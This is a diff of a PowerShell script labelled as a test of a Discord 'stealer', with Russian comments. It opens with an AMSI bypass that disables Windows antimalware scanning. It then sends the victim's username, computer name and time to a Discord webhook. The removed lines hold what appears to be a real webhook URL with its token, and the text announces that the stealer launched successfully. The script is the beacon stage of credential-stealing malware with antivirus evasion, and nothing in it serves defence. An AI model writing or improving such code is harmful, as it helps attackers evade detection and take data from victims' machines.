@@ -1,18 +1,28 @@
-# Минимальный тест — ничего не крадёт, просто отправляет сообщение
+# === ПРОСТОЙ ТЕСТ ДЛЯ DISCORD (2026) ===
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-$webhook = "https://discord.com/api/webhooks/1464644525132742688/Nklo9KcxdCsJF4wn7QX7JkqT5w4diK_iax_V1m_zoFJtStdrYBF6-FYsjSakPULKJW0T"   # ← вставь свой webhook
+$webhook = "https://discord.com/api/webhooks/ТОЙ_ПОЛНЫЙ_ВЕБХУК_URL_СЮДА"   # ← ВСТАВЬ СВОЙ ПОЛНЫЙ WEBHOOK
 
 $payload = @{
-content = "✅ Стиллер запустился успешно!`nПользователь: $($env:USERNAME)`nПК: $($env:COMPUTERNAME)`nВремя: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-username = "Stealer Test"
+content = "✅ ТЕСТОВОЕ СООБЩЕНИЕ`nПользователь: $($env:USERNAME)`nПК: $($env:COMPUTERNAME)`nВремя: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+username = "Stealer"
 } | ConvertTo-Json
 
 try {
-Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 15
-"Тест отправлен успешно" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8
-} catch {
-"Ошибка: $($_.Exception.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8
+Invoke-RestMethod -Uri $webhook `
+-Method Post `
+-Body $payload `
+-ContentType "application/json" `
+-UseBasicParsing `
+-TimeoutSec 15
+
+"✅ Успешно отправлено в Discord" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Force
+}
+catch {
+"❌ Ошибка $($_.Exception.Response.StatusCode): $($_.Exception.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Force
+if ($_.ErrorDetails.Message) {
+"Детали: $($_.ErrorDetails.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Append
+}
 }
 
-Start-Sleep -Seconds 30
+"Тест завершён: $(Get-Date)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Append
